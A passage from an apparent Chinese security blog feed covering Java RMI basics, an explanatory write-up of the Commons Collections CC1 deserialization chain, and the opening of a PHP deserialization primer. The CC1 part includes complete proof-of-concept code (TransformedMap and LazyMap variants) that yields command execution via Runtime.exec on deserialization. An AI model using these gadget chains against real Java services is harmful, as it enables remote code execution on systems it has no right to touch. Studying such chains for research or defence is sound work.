title="定义一个远程接口"></a>定义一个远程接口</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;   &#x2F;&#x2F;引入Remote接口</span><br><span class="line">public interface IHello extends Remote&#123;  &#x2F;&#x2F;实现一个Remote接口</span><br><span class="line">  public String sayHello(String name) throws java.rmi.RemoteException;</span><br><span class="line">&#x2F;&#x2F;若是Remote接口里某个方法抛出RemoteException异常,就意味着这是一个可以被远程调用的方法,但目前这个方法还未被具体实现.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="远程接口的实现类"><a href="#远程接口的实现类" class="headerlink" title="远程接口的实现类"></a>远程接口的实现类</h3><p>刚刚我们定义了一个Remote接口,但是他的方法还未具体实现.我们就来实现远程接口的实现类吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements IHello&#123; &#x2F;&#x2F;定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲))</span><br><span class="line">    protected HelloImpl throws RemoteException&#123;&#x2F;&#x2F;必须要有一个抛出RemoteException异常的显示构造函数</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException&#123;</span><br><span class="line">        return &quot;Hello&quot;+name;    &#x2F;&#x2F;定义实现类方法的具体代码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两台JVM通讯的第一步-RMI-Registry"><a href="#两台JVM通讯的第一步-RMI-Registry" class="headerlink" title="两台JVM通讯的第一步:RMI Registry"></a>两台JVM通讯的第一步:RMI Registry</h2><p>何为RMI Registry<br>可以理解为部署在被远程调用的JAVA虚拟机上的一个应用,用于将stub绑定到Registry服务的URL上。</p><p>服务端绑定stub到指定url</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;, hello);   </span><br><span class="line">&#x2F;&#x2F;如此处就是把hello这个对象绑定在了rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello这个URL</span><br></pre></td></tr></table></figure><p>随后客户端想要远程调用hello这个对象的方法时，就需</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IHello hello &#x3D; (IHello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;);</span><br><span class="line">&#x2F;&#x2F;此刻客户端查找出了hello对象的stub所在url,服务端返回hello对象的Stub</span><br><span class="line">&#x2F;&#x2F;此时的数据类型似乎必须是接口类</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152319.png" alt="QQ截图20210219152319"></p><h2 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152334.png" alt="QQ截图20210219152334"></p><p>由上文可知当客户机远程调用一个对象时,返回的其实不是对象本身,而是stub.<br>你可以理解stub为一个中继站，当客户机调用该对象某个方法时,实际上是通过stub以socket的方式向服务器端的skeleton发送序列化处理的方法名和参数（skeleton可以理解为服务器端上的真实对象)<br>服务端的skeletion反序列化得到的方法名和参数并处理后再以socket的方式把该方法生成的结果传回stub,stub再把数据返回给客户机</p><h2 id="代码实现远程调用"><a href="#代码实现远程调用" class="headerlink" title="代码实现远程调用"></a>代码实现远程调用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器端</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">interface Hello extends Remote&#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HelloImpl extends UnicastRemoteObject implements Hello&#123;</span><br><span class="line">    protected HelloImpl()throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException&#123;</span><br><span class="line">        return &quot;Hello&quot;+name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">public class Server&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">    try&#123;&#x2F;&#x2F;必须有try..catch</span><br><span class="line">        Hello hello &#x3D; new HelloImpl();  &#x2F;&#x2F;似乎数据类型只能是接口类</span><br><span class="line">        LocateRegistry.createRegistry(1080);  &#x2F;&#x2F;将RMI registry的端口设置为1080</span><br><span class="line">        java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;, hello);&#x2F;&#x2F;</span><br><span class="line">将hello这个方法对象绑定在指定url上,rmi协议</span><br><span class="line">        System.out.print(&quot;OK&quot;);</span><br><span class="line">    &#125;catch(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">客户机端</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">public class Client&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;&#x2F;&#x2F;必须有try..catch</span><br><span class="line">        Hello hello_client &#x3D; (Hello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;);  &#x2F;&#x2F;服务器端绑定在该url的对象数据类型是Hello，所以这里的数据类型也是Hello</span><br><span class="line">        System.out.print(hello_client.sayHello(&quot;fuck&quot;));</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152343.png" alt="QQ截图20210219152343"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-代理&quot;&gt;&lt;a href=&quot;#java-代理&quot; class=&quot;headerlink&quot; title=&quot;java 代理&quot;&gt;&lt;/a&gt;java 代理&lt;/h1&gt;&lt;p&gt;代理的作用，就是在原有类的代码不发生改动的情况下，添加新功能。起到一个修饰器的作用。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-CC链1</title>
    <link href="http://const27.com/2021/02/19/cc%E9%93%BE1/"/>
    <id>http://const27.com/2021/02/19/cc%E9%93%BE1/</id>
    <published>2021-02-19T09:22:05.037Z</published>
    <updated>2021-02-19T08:47:45.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Transformer-Map-链"><a href="#Transformer-Map-链" class="headerlink" title="Transformer Map 链"></a>Transformer Map 链</h2><h3 id="RCE原理"><a href="#RCE原理" class="headerlink" title="RCE原理"></a>RCE原理</h3><p>我在网上找到了一则利用代码，虽然这个利用代码很粗浅，并没有CC链1的触发过程，但是对于这条链的原理还是可见一斑的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]</span><br><span class="line">                                &#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain &#x3D; new</span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TransformerMap类"><a href="#TransformerMap类" class="headerlink" title="TransformerMap类"></a>TransformerMap类</h4><p>TransformerMap类是造成这个漏洞的原因之一</p><p>TransformerMap是apacheCommonsCollections里提供的一个数据类型。它可以修饰一个Map类型的对象。当修饰过的Map添加新元素时，它会调用在decorate里声明好的Trasnformer类的transform方法并传入新添的键名或值名。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map DecoratedMap &#x3D; TransformedMap.decorate（Map,keyTransformer,</span><br><span class="line">valueTransformer）</span><br></pre></td></tr></table></figure><p>keyTransformer和valueTransformer分别指向不同的Transformer类。</p><h4 id="Transformer类"><a href="#Transformer类" class="headerlink" title="Transformer类"></a>Transformer类</h4><p>我们看一下Transformer类</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150055.png" alt="QQ截图20210217150055"></p><p>可以发现它只是一个借口，他的方法需要其他子类实现。<br>当TransformerMap在新添元素时就会调用decorate里设定好的Transformer类的transform方法。<br>它的接口实现类有以下几个。</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>这个类主要的两个方法就是这俩了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant &#x3D; constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没什么好说的，就是把传入的对象原原本本返回。</p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>也是两个重要方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName &#x3D; methodName;</span><br><span class="line">        this.iParamTypes &#x3D; paramTypes;</span><br><span class="line">        this.iArgs &#x3D; args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls &#x3D; input.getClass();</span><br><span class="line">                Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是传入方法名，参数类型和参数，然后通过反射来执行这个方法</p><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>也是两个重要方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">     this.iTransformers &#x3D; transformers;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public Object transform(Object object) &#123;</span><br><span class="line">     for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">         object &#x3D; this.iTransformers[i].transform(object);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     return object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是把传入的多个Transfomer类的transformer方法依次执行，每个transformer方法执行后返回的对象会被当做下一次执行的时候传入的参数。</p><p>通过以上信息，我们就可以清晰的看懂上面的payload了。<br>先通过ConstantTransformer获得 Runtime类，再通过InvokerTransformer执行exec方法，然后通过ChainedTransformer将两个类串起来，让InvokerTransformer以ConstantTrasformer返回的Runtime类为参数执行exec方法，达到RCE的目的。</p><h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><p>触发，我们选择的地方是sun.reflect.annotation.AnnotationInvocationHandler的readObject方法，反序列化的入口点基本都在这里：readobjcect方法。（注意8u71以下才能有触发点，之后的版本已被修复）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150130.png" alt="QQ截图20210217150130"></p><p>触发点代码。<br>我们可以发现，它对传入的map的每一个value执行了setValue。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150142.png" alt="QQ截图20210217150142"></p><p>可以很明显的发现会对值进行transform方法。也就是相当于触发了一次Map.put()。接下来，就是payload构造时间了。</p><p>但是 AnnotationInvocationHandler 是内部类无法直接实例化，但它的父类InvocationHandler可以，我们可以通过反射得到 AnnotationInvocationHandler 构造方法，然后对其使用newInstance再向上转型为父类 InvocationHandler 。既然要获得对象，我们就应该关注一下它的构造方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 &#x3D; var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length &#x3D;&#x3D; 1 &amp;&amp; var3[0] &#x3D;&#x3D; Annotation.class) &#123;</span><br><span class="line">        this.type &#x3D; var1;</span><br><span class="line">        this.memberValues &#x3D; var2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要传入两个参数，var2不用说了就是我们传入的Map，var1呢？是Annotation类，即所有注释类的接口。我们必须在此处传入一个注释类才能使if判断为真，才能把我们的参数中的Map传入。<br>但是并不是所有注释类传进去都有效，注释类（实际上就是接口）必须有定义的方法才能正常触发反序列化。关于此点我们后面再详细谈谈。</p><p>因为再readObject方法里我们会执行**Map var3 = var2.memberTypes()**，我们看看memberTypes源码。</p><p>发现是返回构造方法中定义好的memberTypes属性。而这个memberTypes属性又和上一行的var2属性有关，var2属性又与getDecalredMethods有关…因此我才猜测 “注释类必须有定义的方法才能正常触发反序列化 “,但实际结果确实如此。<br>目前找到的能够正常触发漏洞的注释类有 Target Retention SuppressWarnings .无一例外他们作为接口都定义了方法。而且在我翻阅一些参考文档后，发现确实是这样</p><p>另外一点需要注明的是，Runtime类没有继承Serialize接口，也就是说它不能被直接序列化。<br>也就是说如果我们在transformer链里想直接通过有*<em>new ConstantTransformer(Runtime.\</em>getRuntime*())**来获取Runtime对象时，会反序列化失败。<br>但是Class类是有继承Serialize接口的，我们可以通过transformer链和反射来在反序列化阶段逐步创建Runtime类，继而解决这个问题</p><p>总结一下几个坑点：<br>1.Runtime类不能被序列化<br>\2. AnnotationInvocationHandler 无法直接实例化，可通过反射获得对象<br>3.注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类<br>OK，以上知道了后就能试着写一下payload了（这个payload依旧不能正常执行，错误出处间代码注释，具体原因看下文）。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;new String(&quot;getRuntime&quot;),new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;calc.exe&quot;)&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            innermap.put(&quot;sc&quot;,&quot;b&quot;);  &#x2F;&#x2F;不能执行的原因在这里，如果是put(&quot;value&quot;,&quot;a&quot;)就可以正常执行</span><br><span class="line">            Map outmap &#x3D; TransformedMap.decorate(innermap,null,chain);</span><br><span class="line"></span><br><span class="line">            Class Annotation &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor AnnotationCons &#x3D; Annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            AnnotationCons.setAccessible(true);</span><br><span class="line">            InvocationHandler InvocationHandler &#x3D; (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap);</span><br><span class="line"></span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));</span><br><span class="line">            a.writeObject(InvocationHandler);</span><br><span class="line">            a.close();</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">            b.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么不能执行，这原因与上面提到的“ 注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类 ”很有关联。<br>因为涉及JVM的一些东西，我们不会怎么去深究，就是浅浅的看一下，做出一些推测。</p><p>首先我们关注到 AnnotationInvocationHandler 的readObject。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150215.png" alt="QQ截图20210217150215"></p><p>接下来就是复杂的推理了，建议先把各方法的意义弄明白<br>发现必须要var7！=null才能正常触发反序列化漏洞，那么var7的来源是从(Map)var3中获得以(String)var6为键名的值。var6是var3中一项的键名。而var3的来源是(Annotation)var2的menberTypes,我们跟进这个方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150244.png" alt="QQ截图20210217150244"></p><p>那么var1就是AnnotationInvocationHandler的type属性了，而这个type属性在其构造方法中就定义好了，是传入的注释类。<br>也就是说var1就是我们在实例 AnnotationInvocationHandler 时传入的注释类。<br>结合以上流程，我们就可以知道这个过程是:<br>从 实例 AnnotationInvocationHandler 时传入的注释类 中获取最后一个方法，然后把它编入为一个HashMap(以下称为注释方法Map)的一个键名并给予值。在readObject时会遍历传入的Map，如果在传入的Map中找到了一项的键名在注释方法Map中存在（即 在传入的Map中找到了一项的键名与实例化时传入的注释类的最后一个方法同名），则if条件为真，攻击成功。<br>所以上面为什么put(“value”,任意)才能达成攻击的原因是， Target Retention SuppressWarnings 这三个注释类都有且只有一个方法名为value的方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150343.png" alt="QQ截图20210217150343"></p><p>分析完了。这个洞利用版本只能在8u71以前，比较古老无用。</p><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="RCE原理-1"><a href="#RCE原理-1" class="headerlink" title="RCE原理"></a>RCE原理</h3><p>LazyMap的获得方法和TransfromerMap差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    Map innerMap &#x3D; new HashMap();</span><br><span class="line">    Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    if (!super.map.containsKey(key)) &#123;</span><br><span class="line">        Object value &#x3D; this.factory.transform(key);</span><br><span class="line">        super.map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return super.map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在对LazyMap使用get方法时，它会执行this.factory.transform(key),而this.factory.transform如果去跟进分析的话，实质上就是调用我们在decorate传进去的Transformer类。</p><h3 id="触发-1"><a href="#触发-1" class="headerlink" title="触发"></a>触发</h3><p>LazyMap的触发点也在 AnnotationInvocationHandler 中，但不是在readObject方法，而是在invoke方法。invoke方法中有一行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object var6 &#x3D; this.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p>其中this.memberVales是在构造方法中定义为传入的Map。</p><p>那么invoke方法要怎么才能触发呢？答案是动态代理。<br>熟悉动态代理的朋友肯定直到，invoke方法时动态代理中的一个特殊的方法，在代理类中无论执行什么方法，实质上都是在执行invoke方法。</p><p>那么接下来就是骚思路了：<br>我们通过反射和向上转型得到一个 <strong>AnnotationInvocationHandler(Class var1, Map var2)</strong> 对象。<br>构建一个Map的代理类，其第三个参数是刚刚得到的 <strong>AnnotationInvocationHandler</strong> 对象，再故技重施将其通过向上转型得到一个 <strong>AnnotationInvocationHandler</strong> 对象。当该对象反序列化执行readObjct方法时，会执行一下entryset方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150359.png" alt="QQ截图20210217150359"></p><p>本质上来说，是对一个代理类执行了一下entrySet方法，即执行了代理类的invoke方法，又因为代理类的第三个参数填入的是 <strong>AnnotationInvocationHandler</strong> 对象，其内部已经写好了invoke方法，所以此处执行的代理类的invoke方法即 <strong>AnnotationInvocationHandler</strong> 对象的invoke方法，继而触发了get方法，继而触发了漏洞。这是一个很妙的地方</p><p>多说无益，整paylaod吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">            org.apache.commons.collections.Transformer[] transformers &#x3D; new org.apache.commons.collections.Transformer[]&#123;</span><br><span class="line">                    &#x2F;&#x2F; 包装对象</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;getRuntime&quot;,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                            null,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;calc&quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            Map outermap &#x3D; LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            cons.setAccessible(true);</span><br><span class="line">&#x2F;&#x2F;妙处</span><br><span class="line">            InvocationHandler handler &#x3D; (InvocationHandler) cons.newInstance(Override.class,outermap);&#x2F;&#x2F;获得一个AnnotationInvocationHandler对象</span><br><span class="line">            Map Prox &#x3D; (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);&#x2F;&#x2F;创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法</span><br><span class="line">            InvocationHandler handler1 &#x3D; (InvocationHandler) cons.newInstance(Override.class,Prox);  &#x2F;&#x2F;将代理Map传入，当代理Map被执行任一方法时，执行invoke方法</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;));</span><br><span class="line">            a.writeObject(handler1);</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Transformer-Map-链&quot;&gt;&lt;a href=&quot;#Transformer-Map-链&quot; class=&quot;headerlink&quot; title=&quot;Transformer Map 链&quot;&gt;&lt;/a&gt;Transformer Map 链&lt;/h2&gt;&lt;h3 id=&quot;RCE原理</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化</title>
    <link href="http://const27.com/2021/02/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://const27.com/2021/02/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-02-19T09:22:02.409Z</published>
    <updated>2021-02-21T07:34:39.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php反序列化基础"><a href="#php反序列化基础" class="headerlink" title="php反序列化基础"></a>php反序列化基础</h1><h2 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">construct(): 当本对象被创建的时候自动调用，（unserialize()时不会被自动调用）</span><br><span class="line">wakeup():    对象被unserialize()时自动调用</span><br><span class="line">destruct():  当本对象被销毁时自动调用</span><br><span class="line">tostring():  当本对象被当作字符串处理时调用(echo等)</span><br><span class="line">get()&#x2F;set():       当试图获取&#x2F;写入一个不可达到属性或不存在的值时，会自动调用</span><br><span class="line">call():      与get类似，当试图调用一个不可到达方法时调用</span><br><span class="line">sleep&#x2F;wakeup  当对象被序列化&#x2F;反序列化时调用</span><br><span class="line">invoke       当对象被当作函数使用时调用。</span><br></pre></td></tr></table></figure><p>其中，对于to_string()的触发条件有很多：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo&#x2F;print 打印输出对象时</span><br><span class="line">对象与字符串拼接或&#x3D;&#x3D;比较时</span><br><span class="line">对象在经过字符串处理函数如 strlen()strstr()等时以及class_exists()时</span><br></pre></td></tr></table></figure><h3 id="ctf中的反序列化经验"><a href="#ctf中的反序列化经验" class="headerlink" title="ctf中的反序列化经验"></a>ctf中的反序列化经验</h3><p>1.序列化后的结果，一切以var_dump出来的页面的源代码界面为准!,且源代码中的乱码部分hex编码都是00！ 此外 private的序列化后属性名会变为 %00class_name%00shuxing_name protected 